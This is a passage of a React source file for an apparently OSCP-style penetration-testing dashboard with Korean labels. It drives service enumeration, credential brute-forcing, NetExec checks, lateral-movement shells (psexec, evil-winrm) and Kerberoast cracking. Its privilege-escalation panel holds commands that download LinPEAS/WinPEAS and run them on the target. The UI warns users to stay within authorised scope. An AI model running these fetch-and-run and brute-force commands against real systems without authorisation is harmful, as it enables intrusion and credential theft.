            aria-label={servicesCollapsed ? "서비스 목록 펼치기" : "서비스 목록 접기"}
            aria-expanded={!servicesCollapsed}
            title={servicesCollapsed ? "서비스 목록 펼치기" : "서비스 목록 접기"}
            onClick={() => setServicesCollapsed((collapsed) => {
              localStorage.setItem("oscp-services-panel-collapsed", String(!collapsed));
              return !collapsed;
            })}
          >{servicesCollapsed ? "›" : "‹"}</button>
          <ServiceList
            services={services.data}
            selectedId={serviceId}
            onSelect={(id) => {
              setServiceId(id);
              workRef.current?.scrollTo({top: 0, behavior: "smooth"});
            }}
          />
          {!servicesCollapsed && <div
            className="layoutResizeHandle servicesResizeHandle"
            role="separator"
            aria-label="서비스 목록 너비 조절"
            aria-orientation="vertical"
            aria-valuemin={180}
            aria-valuemax={420}
            aria-valuenow={servicesWidth}
            title="드래그하거나 마우스 휠·방향키로 너비 조절"
            tabIndex={0}
            onPointerDown={beginServicesResize}
            onPointerMove={resizeServices}
            onPointerUp={finishServicesResize}
            onPointerCancel={finishServicesResize}
            onWheel={(event) => {
              event.preventDefault();
              applyServicesWidth(servicesWidth + (event.deltaY < 0 ? 16 : -16));
            }}
            onKeyDown={(event) => {
              if (!["ArrowLeft", "ArrowRight", "Home", "End"].includes(event.key)) return;
              event.preventDefault();
              if (event.key === "Home") applyServicesWidth(180);
              else if (event.key === "End") applyServicesWidth(420);
              else applyServicesWidth(servicesWidth + (event.key === "ArrowRight" ? 16 : -16));
            }}
          />}
        </aside>
        <section className="work" ref={workRef}>
          <div className="serviceHead">
            <div>
              <span>
                {service?.protocol || "tcp"} / {service?.port || "—"}
              </span>
              <h1>{service?.name?.toUpperCase() || "서비스 선택"}</h1>
            </div>
            <div className="risk">수동 확인 필요</div>
          </div>
          {service && (
            <section className="serviceIdentitySummary" aria-label="식별된 서비스 정보">
              <div><span>서비스</span><b>{service.name || "unknown"}</b></div>
              <div><span>제품</span><b>{service.product || "미확인"}</b></div>
              <div><span>버전</span><b>{service.version || "미제공"}</b></div>
              <div><span>TLS</span><b>{service.tls ? "사용" : "미탐지"}</b></div>
              <div className="serviceIdentitySummary__wide">
                <span>CPE</span><b title={serviceCpes.join(", ")}>
                  {serviceCpes.join(", ") || "미확인"}
                </b>
              </div>
            </section>
          )}
          {service && !service.product && !service.version && (
            <div className="warning">
              <b>제품·버전 미확인</b>
            </div>
          )}
          {service&&<ServiceIntelligencePanel data={intelligence.data}
            loading={intelligence.isLoading} error={intelligence.isError}
            onRun={(id)=>{const command=commands.data?.find(item=>item.id===id);
              if(command)reviewCommand(command);}}/>}
          <div className="tabs">
            <b>서비스 대시보드</b>
            <span>스캔 상세</span>
            <span>이력</span>
            <button
              className="credentialShortcut"
              disabled={!authenticationCommands.length}
              onClick={() => credentialAuditRef.current?.scrollIntoView({
                behavior: "smooth",
                block: "start",
              })}
            >
              {service?.name?.toLowerCase() === "ftp"
                ? "익명 로그인 확인"
                : "대입 공격"}
              {authenticationCommands.length
                ? ` (${authenticationCommands.length})`
                : ""}
            </button>
            <button
              disabled={!service}
              onClick={() => {
                if (!service) return;
                localStorage.setItem(
                  "oscp-workspace-exploit-service",
                  String(service.id),
                );
                location.hash = "exploit-research";
              }}
            >
              Exploit 후보 조사
            </button>
          </div>
          {service && (
            <section className="serviceIntel" aria-labelledby="service-intel-title">
              <header>
                <div>
                  <span>선택한 포트 요약</span>
                  <h2 id="service-intel-title">서비스 대시보드</h2>
                </div>
                <strong>
                  {missingCount
                    ? `${missingCount}개 미확인`
                    : "핵심 정보 확인됨"}
                </strong>
              </header>
              <div className="serviceIntel__facts">
                <dl>
                  <div><dt>Target</dt><dd>{target?.ip || "미확인"}</dd></div>
                  <div><dt>Hostname</dt><dd className={!target?.hostname ? "unknown" : ""}>{target?.hostname || "미확인"}</dd></div>
                  <div><dt>운영체제</dt><dd className={!target?.os_guess ? "unknown" : ""}>{target?.os_guess || "미확인"}</dd></div>
                  <div><dt>서비스</dt><dd>{service.name || "unknown"} · {service.port}/{service.protocol}</dd></div>
                  <div><dt>제품</dt><dd className={!service.product ? "unknown" : ""}>{service.product || "미확인"}</dd></div>
                  <div><dt>버전</dt><dd className={!service.version ? "unknown" : ""}>{service.version || "미확인"}</dd></div>
                </dl>
                <div className="serviceIntel__progress">
                  <span>조사 진행</span>
                  <b>{completedChecks}<small>회 완료</small></b>
                  <p>실행 기록 {serviceExecutions.length}개 · 스캔 관찰 {observations.length}개</p>
                </div>
              </div>
              <div className="serviceIntel__lower">
                <section>
                  <h3>미확인 항목</h3>
                  <div className="missingFacts">
                    {!target?.hostname && (
                      <div>
                        <span>Hostname</span>
                        <button
                          className={autoCheckState(["target-hostname-identity"])?.busy
                            ? "isChecking" : ""}
                          disabled={autoCheckState(["target-hostname-identity"])?.busy ||
                            !targetCommands.data}
                          onClick={() => {
                            const command = targetCommands.data?.find(
                              (item) => item.id === "target-hostname-identity",
                            );
                            if (command) reviewCommand(command);
                          }}>
                          {autoCheckState(["target-hostname-identity"])?.content ||
                            "자동 확인하기"}
                        </button>
                      </div>
                    )}
                    {!target?.os_guess && (
                      <div>
                        <span>운영체제</span>
                        <button
                          className={autoCheckState(["target-os-identity"])?.busy
                            ? "isChecking" : ""}
                          disabled={autoCheckState(["target-os-identity"])?.busy ||
                            !targetCommands.data}
                          onClick={() => {
                            const command = targetCommands.data?.find(
                              (item) => item.id === "target-os-identity",
                            );
                            if (command) reviewCommand(command);
                          }}>
                          {autoCheckState(["target-os-identity"])?.content ||
                            "자동 확인하기"}
                        </button>
                      </div>
                    )}
                    {!!missingFacts.length && (() => {
                      const candidates = rankInvestigationCommands(
                        "정확한 버전",
                        commands.data || [],
                      );
                      const state = autoCheckState(candidates.map((item) => item.id));
                      return (
                        <div>
                          <span>{missingFacts.join(" · ")}</span>
                          <button
                            className={state?.busy ? "isChecking" : ""}
                            disabled={state?.busy || !commands.data}
                            onClick={() => {
                              const command = candidates.find((item) =>
                                !serviceExecutions.some((execution) =>
                                  execution.template_id === item.id &&
                                  ["completed", "no_response"].includes(
                                    execution.status,
                                  )))
                                || candidates[0];
                              if (command) reviewCommand(command);
                            }}
                          >
                            {state?.content || "한 번에 확인하기"}
                          </button>
                        </div>
                      );
                    })()}
                    {target?.hostname && target?.os_guess && !missingFacts.length && (
                      <p>현재 표시할 미확인 항목이 없습니다.</p>
                    )}
                  </div>
                </section>
                <section>
                  <h3>스캔에서 수집한 관찰</h3>
                  {observations.length ? observations.map((item) => (
                    <details key={item.id}>
                      <summary>{item.id}</summary>
                      <pre>{item.output}</pre>
                    </details>
                  )) : <p>아직 저장된 NSE 관찰 결과가 없습니다.</p>}
                </section>
                <section>
                  <h3>바로 실행할 확인 명령</h3>
                  <p>전체 명령을 검토한 후 실행하세요.</p>
                  <div>
                    {commands.data
                      ?.filter((item) => [
                        "service-version",
                        "service-version-udp",
                        "telnet-info",
                        "telnet-banner",
                        "telnet-version-trace",
                      ].includes(item.id))
                      .slice(0, 3)
                      .map((item) => (
                        <button key={item.id} onClick={() => {
                          reviewCommand(item);
                        }}>
                          {item.name}
                        </button>
                      ))}
                  </div>
                </section>
              </div>
            </section>
          )}
          {!!authenticationCommands.length && (
            <section ref={credentialAuditRef} className="credentialAudit"
              aria-labelledby="credential-audit-title">
              <header>
                <div>
                  <span>프로토콜별 인증 점검</span>
                  <h2 id="credential-audit-title">{credentialProfile.title}</h2>
                </div>
                <strong>선택한 {service?.name || "서비스"}에만 실행</strong>
              </header>
              <p>
                {credentialProfile.description} 각 작업은 자동 실행되지 않으며
                전체 명령과 잠금 위험을 검토한 뒤 시작됩니다.
              </p>
              <a className="intruderLaunch" href="#web">
                <span>HTTP 요청 후보를 직접 구성하려면</span>
                <b>Web Testing · Intruder 열기 →</b>
              </a>
              <div className="credentialDataset">
                <div>
                  <b>{credentialProfile.identityLabel}</b>
                  <code>{credentialProfile.identities}</code>
                </div>
                <div>
                  <b>{credentialProfile.secretLabel}</b>
                  <code>{credentialProfile.secrets}</code>
                </div>
                <small>
                  {credentialProfile.limits}
                </small>
              </div>
              <div className="credentialActions">
                {authenticationCommands.map((command) => {
                  const commandRun = runStates[command.id];
                  const commandBusy = !!commandRun &&
                    ["starting", "running"].includes(commandRun.status);
                  const commandElapsed = commandRun
                    ? Math.max(0, Math.floor((clock - commandRun.startedAt) / 1000)) : 0;
                  const auditSummary = commandRun?.status === "completed" &&
                      commandRun.stdout != null
                    ? summarizeCredentialAudit(
                      command.id,
                      commandRun.stdout,
                      commandRun.stderr || "",
                    )
                    : null;
                  const auditOutput = commandRun
                    ? `${commandRun.stdout || ""}${commandRun.stderr || ""}`
                    : "";
                  return <article key={command.id}
                    className={commandBusy ? "isRunning" : ""}
                    aria-busy={commandBusy}>
                    <div>
                      <b>{command.name}</b>
                      <small>{command.description}</small>
                      {commandRun && (
                        <span className={`credentialRun credentialRun--${commandRun.status}`}>
                          <i aria-hidden="true" />
                          {commandBusy
                            ? `${commandRun.status === "starting" ? "실행 준비" : "프로세스 실행 중"} · ${commandElapsed}초`
                            : `${statusLabel[commandRun.status] || commandRun.status} · ${commandElapsed}초`}
                        </span>
                      )}
                    </div>
                    <span className={`credentialRisk credentialRisk--${command.risk}`}>
                      {command.risk === "high" ? "잠금 위험" : "노출 확인"}
                    </span>
                    <button disabled={commandBusy}
                      onClick={() => reviewCommand(command)}>
                      {commandBusy ? "대입 중…" : "대입 공격 검토·실행"}
                    </button>
                    {auditSummary && (
                      <section className={`credentialResult credentialResult--${auditSummary.status}`}>
                        <b>{auditSummary.label}</b>
                        <details>
                          <summary>검사 원문 보기</summary>
                          <pre>{auditOutput ||
                            "명령이 출력 없이 완료되었습니다."}</pre>
                        </details>
                      </section>
                    )}
                  </article>;
                })}
              </div>
            </section>
          )}
          <div className="cards">
            {investigationCommands.map((c) => {
              const cRun = runStates[c.id];
              const cBusy = !!cRun && ["starting", "running"].includes(cRun.status);
              const cElapsed = cRun
                ? Math.max(0, Math.floor((clock - cRun.startedAt) / 1000)) : 0;
              return (
              <article
                key={c.id}
                className={cBusy ? "isRunning" : ""}
              >
                <div>
                  {cRun ? (
                    <span className={`commandStatus commandStatus--${cRun.status}`}>
                      {statusLabel[cRun.status] || (
                        cRun.status === "starting" ? "실행 준비 중" : cRun.status
                      )}
                    </span>
                  ) : (
                    <span className="badge">
                      위험: {riskLabel[c.risk] || c.risk}
                    </span>
                  )}
                  <h3>{c.name}</h3>
                  <p>{c.description}</p>
                </div>
                <code>{c.preview}</code>
                <div className="actions">
                  <button
                    onClick={() => navigator.clipboard.writeText(c.preview)}
                  >
                    복사
                  </button>
                  <button
                    className="primary"
                    disabled={cBusy}
                    onClick={() => {
                      reviewCommand(c);
                    }}
                  >
                    {cBusy ? `실행 중 · ${cElapsed}초` : "검토 후 실행 →"}
                  </button>
                </div>
              </article>
              );
            })}
            {!investigationCommands.length && (
              <p className="investigationEmpty">
                이미 확인된 항목을 제외하면 실행할 명령이 없습니다.
              </p>
            )}
          </div>
          {service && authContextNotice[service.name] && (
            <div className="identityNotice" role="note">
              <b>이 프로토콜은 추가 인증 문맥이 필요합니다</b>
              <p>{authContextNotice[service.name]}</p>
            </div>
          )}
          {guidance && (
            <section className="manualGuidance" aria-labelledby="manual-guidance-title">
              <div>
                <span>수동 상호작용 안내</span>
                <h2 id="manual-guidance-title">{guidance.title}</h2>
                <p>
                  대화형 명령은 Kali의 실제 데스크톱 터미널에서 실행됩니다.
                  계정 후보는 복사한 뒤 터미널에서 직접 입력하세요.
                </p>
              </div>
              <code>{guidance.command}</code>
              <button
                onClick={() => navigator.clipboard.writeText(guidance.command)}
              >
                접속 명령 복사
              </button>
              <ol>
                {guidance.steps.map((step) => <li key={step}>{step}</li>)}
              </ol>
              <div className="accountCandidates" aria-label="정적 계정 후보">
                <b>로그인 계정 입력</b>
                {guidance.accountCandidates.map((account) => (
                  <button
                    key={account}
                    onClick={() => navigator.clipboard.writeText(account)}
                  >
                    {account} 복사
                  </button>
                ))}
              </div>
              {guidance.verificationCommands?.length && (
                <div className="verificationCommands">
                  <b>로그인 후 버전 확인 명령</b>
                  <p>대상 셸에 로그인한 뒤 운영체제에 맞는 명령 하나를 직접 실행하세요.</p>
                  {guidance.verificationCommands.map((command) => (
                    <div key={command}>
                      <code>{command}</code>
                      <button
                        onClick={() => navigator.clipboard.writeText(command)}
                      >
                        복사
                      </button>
                    </div>
                  ))}
                </div>
              )}
            </section>
          )}
          {focusedRun && (
            <section
              className={`jobStatus jobStatus--${focusedRun.status}`}
              aria-live="polite"
              aria-label="현재 명령 실행 상태"
            >
              <span className="jobStatus__dot" aria-hidden="true" />
              <div>
                <b>
                  작업 #{focusedRun.id || "준비"} ·{" "}
                  {statusLabel[focusedRun.status] || focusedRun.status}
                </b>
                <small>
                  {focusedRun.status === "starting" && "실행 요청을 준비하고 있습니다."}
                  {focusedRun.status === "running" &&
                    (focusedRun.processAlive
                      ? "백엔드가 명령 프로세스 실행을 확인했습니다."
                      : "명령을 실행했으며 다음 상태 신호를 기다리고 있습니다.")}
                  {focusedRun.status === "completed" && "명령 실행과 결과 저장이 완료되었습니다."}
                  {focusedRun.status === "no_response" && "대상 응답 또는 식별 결과가 없습니다."}
                  {["failed", "error"].includes(focusedRun.status) &&
                    (focusedRun.message || "명령 실행에 실패했습니다.")}
                  {focusedRun.status === "stopped" && "명령 실행이 중단되었습니다."}
                </small>
              </div>
              <dl>
                <div>
                  <dt>경과 시간</dt>
                  <dd>{runElapsed < 60
                    ? `${runElapsed}s`
                    : `${Math.floor(runElapsed / 60)}m ${runElapsed % 60}s`}</dd>
                </div>
                <div>
                  <dt>프로세스</dt>
                  <dd>{focusedRun.status === "running"
                    ? focusedRun.processAlive ? "실행 확인됨" : "확인 중"
                    : "종료됨"}</dd>
                </div>
                <div>
                  <dt>마지막 서버 응답</dt>
                  <dd>{focusedRun.lastEventAt
                    ? `${Math.max(0, Math.floor((clock - focusedRun.lastEventAt) / 1000))}초 전`
                    : "대기 중"}</dd>
                </div>
              </dl>
              {focusedRun.status === "running" && focusedRun.lastEventAt &&
                clock - focusedRun.lastEventAt > 30000 && (
                  <p className="jobStatus__warning" role="alert">
                    30초 이상 서버 상태 신호가 없습니다. 백엔드 연결을 확인하세요.
                  </p>
                )}
              {activeRuns.length > 1 && (
                <p className="jobStatus__parallelNote">
                  다른 작업 {activeRuns.length - 1}개가 백그라운드에서 함께 실행 중입니다.
                  아래 실행 모니터에서 전환할 수 있습니다.
                </p>
              )}
            </section>
          )}
          <SmbShareResults key={serviceId} targetId={targetId} serviceId={serviceId}
            shares={smbShares} activeShare={lastSpiderShare}
            runState={runStates["smb-share-spider"]}
            serviceExecutions={serviceExecutions} onSpider={spiderSmbShare}
            onViewFile={viewSmbFile}
            onLog={(line) => setOutput((value) => `${value}\n${line}\n`)} />
          {["http", "https", "http-proxy", "ssl/http"].includes(serviceNameLower) && (
            <FuzzingPanel target={target} service={service}
              runState={runStates["http-directory-fuzz"]}
              serviceExecutions={serviceExecutions} evidenceMsg={evidenceMsg}
              onFuzz={runDirectoryFuzz}
              onCaptureEvidence={(execution, title) => void captureEvidence(execution, title)} />
          )}
          {!!netexecProtocol && (
            <section className="netexecCredCheck"
              aria-labelledby="netexec-cred-heading">
              <header>
                <h2 id="netexec-cred-heading">
                  {netexecProtocol.toUpperCase()} 자격증명 확인 (NetExec)
                </h2>
                <small>대입 공격이 아니라 사용자가 입력한 계정 하나만 검증합니다.</small>
              </header>
              {!!credStore.saved.data?.length && (
                <div className="credStore">
                  {credStore.saved.data.map((item) => (
                    <div key={item.id} className="credStoreRow">
                      <button className="credStoreFill"
                        onClick={() => credStore.apply(item)}
                        title="이 계정으로 아래 폼을 채웁니다">
                        <b>{item.domain ? `${item.domain}\\` : ""}{item.username}</b>
                        <span>{item.has_secret ? "🔑 비밀번호 저장됨"
                          : item.secret_hint ? `힌트: ${item.secret_hint}` : "비밀번호 미저장"}
                          {item.source_detail ? ` · ${sourceLabel[item.source_kind]
                            || item.source_kind}: ${item.source_detail}`
                            : sourceLabel[item.source_kind]
                              ? ` · ${sourceLabel[item.source_kind]}` : ""}</span>
                      </button>
                      <button className="credStoreDelete"
                        onClick={() => void credStore.remove(item.id)}
                        aria-label="자격증명 삭제">삭제</button>
                    </div>
                  ))}
                </div>
              )}
              <div className="netexecCredForm">
                <input placeholder="도메인 (선택)" value={credStore.domain}
                  onChange={(e) => credStore.setDomain(e.target.value)} />
                <input placeholder="사용자명" value={credStore.username}
                  onChange={(e) => credStore.setUsername(e.target.value)} />
                <input type="password" placeholder="비밀번호" value={credStore.password}
                  onChange={(e) => credStore.setPassword(e.target.value)} />
                <button disabled={!credStore.username.trim()
                  || (!!netexecCredentialResult
                    && ["starting", "running"].includes(netexecCredentialResult.status))}
                  onClick={checkNetexecCredential}>
                  {netexecCredentialResult
                    && ["starting", "running"].includes(netexecCredentialResult.status)
                    ? "확인 중…" : "NetExec으로 확인"}
                </button>
              </div>
              <div className="credSaveBox">
                <div className="netexecCredForm netexecCredForm--save">
                  <input placeholder="비밀번호 힌트 (선택)"
                    value={credStore.hint} onChange={(e) => credStore.setHint(e.target.value)} />
                  <button disabled={!credStore.username.trim() || credStore.saving}
                    onClick={() => void credStore.save()}>
                    {credStore.saving ? "저장 중…" : "Credential Store에 저장"}
                  </button>
                </div>
                <div className="credProvenance">
                  <label>출처
                    <select value={credStore.sourceKind}
                      onChange={(e) => credStore.setSourceKind(e.target.value)}>
                      <option value="manual">직접 입력</option>
                      <option value="share-file">공유 파일</option>
                      <option value="web">웹</option>
                      <option value="config">설정 파일</option>
                      <option value="kerberoast">Kerberoast 크랙</option>
                      <option value="reuse">재사용</option>
                      <option value="other">기타</option>
                    </select>
                  </label>
                  <input placeholder="출처 상세 (예: WorkShares/config.ini 12번째 줄)"
                    value={credStore.sourceDetail}
                    onChange={(e) => credStore.setSourceDetail(e.target.value)} />
                  <label className="credStoreSecretToggle">
                    <input type="checkbox" checked={credStore.storeSecret}
                      onChange={(e) => credStore.setStoreSecret(e.target.checked)} />
                    실제 비밀번호도 로컬에 저장 (재사용·명령 자동채움용)
                  </label>
                </div>
              </div>
              {netexecPwned && (
                <div className="netexecPwned">
                  <b>로컬 관리자 권한 확인됨 (Pwn3d!)</b>
                  <span>원문 출력은 실행 이력에서 확인하세요. 아래 버튼들은 같은 계정으로
                    impacket 명령을 데스크톱 셸에 입력만 해둡니다 — 대상과 명령을 다시
                    확인한 뒤 직접 Enter를 눌러야 실행됩니다. 하나가 막히면 다른 걸
                    시도하세요.</span>
                  <div className="netexecPwnedActions">
                    <button onClick={() => void openPsexecShell()}>psexec</button>
                    <button onClick={() => void openLateralShell("wmiexec")}>wmiexec</button>
                    <button onClick={() => void openLateralShell("smbexec")}>smbexec</button>
                    <button onClick={() => void openLateralShell("atexec")}>atexec</button>
                  </div>
                </div>
              )}
              {netexecSshOk && (
                <div className="netexecPwned">
                  <b>SSH 인증 성공</b>
                  <span>원문 출력은 실행 이력에서 확인하세요. 아래 버튼은 순수 셸을 열고
                    ssh 명령을 입력만 해둡니다 — 대상을 다시 확인한 뒤 직접 Enter를
                    누르고, 프롬프트가 뜨면 위에 입력한 비밀번호를 직접 입력하세요.</span>
                  <button onClick={() => void openSshShell()}>SSH 명령 준비하기</button>
                </div>
              )}
              {netexecWinrmOk && (
                <div className="netexecPwned">
                  <b>WinRM 인증 성공</b>
                  <span>원문 출력은 실행 이력에서 확인하세요. 아래 버튼은 순수 셸을 열고
                    evil-winrm 명령을 입력만 해둡니다 — 대상과 계정을 다시 확인한 뒤
                    직접 Enter를 눌러야 실행됩니다.</span>
                  <button onClick={() => void openEvilWinrmShell()}>
                    evil-winrm 명령 준비하기
                  </button>
                </div>
              )}
              {netexecRdpOk && (
                <div className="netexecPwned">
                  <b>RDP 인증 성공</b>
                  <span>RDP는 GUI라 이 앱 안에서 열 수 없습니다. 아래 버튼은 xfreerdp
                    명령을 클립보드에 복사해둘 뿐이며, 직접 터미널에서 확인 후 붙여넣어
                    실행해야 합니다.</span>
                  <button onClick={() => void copyXfreerdpCommand()}>
                    xfreerdp 명령 복사
                  </button>
                </div>
              )}
              {netexecMssqlOk && (
                <div className="netexecPwned">
                  <b>MS SQL 인증 성공</b>
                  <span>원문 출력은 실행 이력에서 확인하세요. 아래 버튼은 순수 셸을 열고
                    impacket-mssqlclient 명령을 입력만 해둡니다 — 대상과 계정을 다시
                    확인한 뒤 직접 Enter를 눌러야 실행됩니다.</span>
                  <button onClick={() => void openMssqlShell()}>
                    impacket-mssqlclient 명령 준비하기
                  </button>
                </div>
              )}
              {netexecProtocol === "ldap" && (
                <div className="netexecPwnedActions" style={{marginTop: "12px"}}>
                  <button onClick={() => void openHashcatShell()}>
                    Kerberoast 해시 → hashcat 명령 준비
                  </button>
                </div>
              )}
              {netexecSuccess && netexecCredentialResult?.id && (
                <div className="netexecEvidence">
                  <button onClick={() => void captureEvidence(
                    {id: netexecCredentialResult.id!,
                     stdout: netexecCredentialResult.stdout,
                     stderr: netexecCredentialResult.stderr},
                    `${netexecProtocol?.toUpperCase()} 자격증명 검증 · ${credStore.username}`,
                    "sensitive")}>
                    Evidence로 저장
                  </button>
                  <button onClick={() => void promoteToFinding(
                    {id: netexecCredentialResult.id!,
                     stdout: netexecCredentialResult.stdout,
                     stderr: netexecCredentialResult.stderr},
                    `${netexecProtocol?.toUpperCase()} 유효 자격증명 · ${credStore.username}`,
                    `${target?.ip} ${service?.port}/${service?.name}에 대해 ` +
                    `${credStore.domain ? credStore.domain + "\\" : ""}${credStore.username} 계정으로 ` +
                    `NetExec ${netexecProtocol} 인증에 성공함.`, "sensitive")}>
                    Finding(Draft)으로 승격
                  </button>
                  {evidenceMsg && <span>{evidenceMsg}</span>}
                </div>
              )}
            </section>
          )}
          {psexecSession && (
            <>
              <section className="privescServer" aria-labelledby="privesc-server-heading">
                <header>
                  <h2 id="privesc-server-heading">권한 상승 스크립트 서버 (LinPEAS/WinPEAS)</h2>
                  <small>{privescServer?.running
                    ? `tun0에서 서비스 중 · ${privescServer.base_url}`
                    : "대상이 접근할 수 있도록 tun0에만 임시 파일서버를 엽니다."}</small>
                </header>
                <div className="privescServerActions">
                  <button disabled={privescServerBusy} onClick={togglePrivescServer}>
                    {privescServerBusy ? "처리 중…"
                      : privescServer?.running ? "서버 중지" : "서버 시작"}
                  </button>
                  <button disabled={!privescServer?.running}
                    onClick={() => void sendPrivescCommand(
                      `curl -sS ${privescServer?.base_url}/linpeas/linpeas.sh | bash`)}>
                    LinPEAS 명령 셸에 입력
                  </button>
                  <button disabled={!privescServer?.running}
                    onClick={() => void sendPrivescCommand(
                      `curl.exe -o winpeas.exe ${privescServer?.base_url}` +
                      `/winpeas/winPEASany.exe && .\\winpeas.exe`)}>
                    WinPEAS 명령 셸에 입력
                  </button>
                </div>
              </section>
              <InteractiveTerminal sessionId={psexecSession.id}
                title="impacket-psexec · 검토 후 Enter"
                initialInput={psexecSession.command}
                inputRequest={psexecInputRequest}
                onClose={() => setPsexecSession(undefined)} />
            </>
          )}
          <div className="terminal">
            <div className={`terminalStatus${focusedRun ? ` terminalStatus--${focusedRun.status}` : ""}`}>
              <span aria-hidden="true" />
              <b>실시간 출력</b>
              <small role="status" aria-live="polite">
                {!focusedRun
                  ? "명령 실행 대기"
                  : `${focusedRun.name} · ${statusLabel[focusedRun.status] ||
                    (focusedRun.status === "starting" ? "실행 준비 중" : focusedRun.status)} · ${runElapsed}초${
                    focusedRun.exitCode == null ? "" : ` · 종료 코드 ${focusedRun.exitCode}`
                  }`}
              </small>
            </div>
            {focusedRun?.message && <p className="terminalError">{focusedRun.message}</p>}
            {currentOutcome && (
              <div className={`executionOutcome executionOutcome--${currentOutcome.tone}`}>
                <b>{currentOutcome.title}</b>
                <span>{currentOutcome.detail}</span>
              </div>
            )}
            <pre>{output}</pre>
          </div>
        </section>
        <aside ref={notesRef} className={`notes${notesCollapsed ? " isCollapsed" : ""}`}
          style={{"--workspace-height": `${workspaceHeight}px`} as CSSProperties}>
          <button
            className="panelDockToggle panelDockToggle--notes"
            type="button"
            aria-label={notesCollapsed ? "실행 및 메모 패널 펼치기" : "실행 및 메모 패널 접기"}
            aria-expanded={!notesCollapsed}
            title={notesCollapsed ? "실행 및 메모 패널 펼치기" : "실행 및 메모 패널 접기"}
            onClick={() => setNotesCollapsed((collapsed) => {
              localStorage.setItem("oscp-execution-panel-collapsed", String(!collapsed));
              return !collapsed;
            })}
          >{notesCollapsed ? "‹" : "›"}</button>
          {!notesCollapsed && <div
            className="notesResizeHandle"
            role="separator"
            aria-label="실행 결과 패널 너비 조절"
            aria-orientation="vertical"
            aria-valuemin={285}
            aria-valuemax={720}
            aria-valuenow={notesWidth}
            tabIndex={0}
            onPointerDown={beginNotesResize}
            onPointerMove={resizeNotes}
            onPointerUp={finishNotesResize}
            onPointerCancel={finishNotesResize}
            onKeyDown={(event) => {
              if (!["ArrowLeft", "ArrowRight"].includes(event.key)) return;
              event.preventDefault();
              const direction = event.key === "ArrowLeft" ? 1 : -1;
              applyNotesWidth(notesWidth + direction * 24);
            }}
            onWheel={(event) => {
              event.preventDefault();
              applyNotesWidth(notesWidth + (event.deltaY < 0 ? 16 : -16));
            }}
          />}
          <ExecutionHistory
            executions={serviceExecutions}
            view={executionView}
            selected={selectedExecution}
            detail={executionDetail}
            onView={setExecutionView}
            onOpen={openExecution}
            onStop={stopSavedExecution}
          />
          {!workspaceCollapsed && <div
            className="workspaceResizeHandle"
            role="separator"
            aria-label="실행 이력과 서비스 작업 공간 높이 조절"
            aria-orientation="horizontal"
            aria-valuemin={180}
            aria-valuemax={workspaceHeightLimit()}
            aria-valuenow={workspaceHeight}
            tabIndex={0}
            onPointerDown={beginWorkspaceResize}
            onPointerMove={resizeWorkspace}
            onPointerUp={finishWorkspaceResize}
            onPointerCancel={finishWorkspaceResize}
            onWheel={(event) => {
              event.preventDefault();
              applyWorkspaceHeight(workspaceHeight + (event.deltaY < 0 ? 18 : -18));
            }}
            onKeyDown={(event) => {
              if (!["ArrowUp", "ArrowDown", "Home", "End"].includes(event.key)) return;
              event.preventDefault();
              if (event.key === "Home") applyWorkspaceHeight(180);
              else if (event.key === "End") applyWorkspaceHeight(workspaceHeightLimit());
              else applyWorkspaceHeight(workspaceHeight + (event.key === "ArrowUp" ? 24 : -24));
            }}
          />}
          <section className={`serviceWorkspacePanel${workspaceCollapsed ? " isCollapsed" : ""}`}>
            <div className="panelTitle">
              <span>서비스 작업 공간</span>
              <button type="button" className="workspaceCollapseButton"
                aria-expanded={!workspaceCollapsed}
                onClick={() => setWorkspaceCollapsed((collapsed) => {
                  localStorage.setItem("oscp-service-workspace-collapsed", String(!collapsed));
                  return !collapsed;
                })}>
                {workspaceCollapsed ? "펼치기 ↑" : "접기 ↓"}
              </button>
            </div>
            {!workspaceCollapsed && <div className="serviceWorkspaceBody">
            <div className="meta">
              <label>Hostname<b>{target?.hostname || "알 수 없음"}</b></label>
              <label>추정 OS<b>{target?.os_guess || "탐지되지 않음"}</b></label>
            </div>
            <h3>Enumeration 체크리스트</h3>
            {[
              "서비스 Banner 확인", "기본 Credential 정책 검토", "버전 증적 저장",
              "주요 경로 기록", "다음 수동 작업 계획",
            ].map((x, i) => (
              <label className="check" key={x}>
                <input type="checkbox" /><span>{x}</span><small>0{i + 1}</small>
              </label>
            ))}
            <h3>검토한 제품·버전</h3>
            <input value={serviceProduct} onChange={(e) => setServiceProduct(e.target.value)}
              placeholder="예: Linux telnetd" aria-label="검토한 서비스 제품" />
            <input value={serviceVersion} onChange={(e) => setServiceVersion(e.target.value)}
              placeholder="예: 0.17" aria-label="검토한 서비스 버전" />
            <h3>서비스 태그</h3>
            <input value={serviceTags} onChange={(e) => setServiceTags(e.target.value)}
              placeholder="web, reviewed" />
            <h3>서비스 메모</h3>
            <textarea value={serviceNotes} onChange={(e) => setServiceNotes(e.target.value)}
              placeholder="이 포트에 대한 Markdown 메모…" />
            <button onClick={saveService}
              disabled={!serviceId || serviceSaveState === "saving"}>
              {serviceSaveState === "saving" ? "저장 중…" :
                serviceSaveState === "saved" ? "저장됨" : "작업 공간 저장"}
            </button>
            {serviceSaveState === "error" && (
              <p className="webError" role="alert">
                제품·버전과 작업 공간을 저장하지 못했습니다.
              </p>
            )}
            <div className="warning">
              <b>실행 안내</b>
              <p>명령은 이 Kali 호스트에서 실행됩니다. 허가 범위와 최종 명령을 확인하세요.</p>
            </div>
            </div>}
          </section>
        </aside>
      </main>
      <ExecutionMonitor runs={activeRuns} focusedId={focusedRunId} now={clock}
        onFocus={(templateId) => {
          focusedRunIdRef.current = templateId;
          setFocusedRunId(templateId);
        }}
        onStop={(templateId) => void stopRun(templateId)} />
      {confirm && (
        <div className="modal" role="presentation">
          <div
            role="dialog"
            aria-modal="true"
            aria-labelledby="command-review-title"
            aria-describedby="command-review-description"
          >
            <span>최종 명령 검토</span>
            <h2 id="command-review-title">{confirm.name}</h2>
            <p id="command-review-description">
              허가된 대상에서만 실행하세요. 대상과 전체 옵션을 확인한 뒤 실행 버튼을 누르세요.
            </p>
            <code>{runWithSudo ? `sudo ${confirm.preview}` : confirm.preview}</code>
            <label className="sudoOption">
              <input
                type="checkbox"
                checked={runWithSudo}
                onChange={(event) => setRunWithSudo(event.target.checked)}
              />
              sudo로 실행
            </label>
            {confirm.risk === "high" && (
              <p className="intrusiveConfirm">
                이 명령은 계정 잠금이나 인증 로그를 발생시킬 수 있습니다.
              </p>
            )}
            <footer>
              <button onClick={() => setConfirm(null)}>취소</button>
              <button
                className="danger"
                onClick={() => run()}
              >
                명령 실행
              </button>
            </footer>
          </div>
        </div>
      )}
    </div>
  );
}
